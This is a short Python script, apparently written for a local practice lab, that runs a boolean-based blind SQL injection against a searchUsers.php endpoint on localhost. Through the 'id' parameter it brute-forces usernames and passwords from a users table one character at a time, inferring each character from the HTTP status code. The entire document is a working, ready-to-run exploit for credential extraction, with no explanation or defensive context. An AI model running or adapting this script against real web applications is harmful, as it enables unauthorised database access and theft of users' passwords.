#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost:8081/searchUsers.php"

characters = string.printable

def makeSQLI():

    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted data")
    extracted_info=""

    for position in range(1,150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            p1.status(f"Position: {position}, Character: {character}")
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()
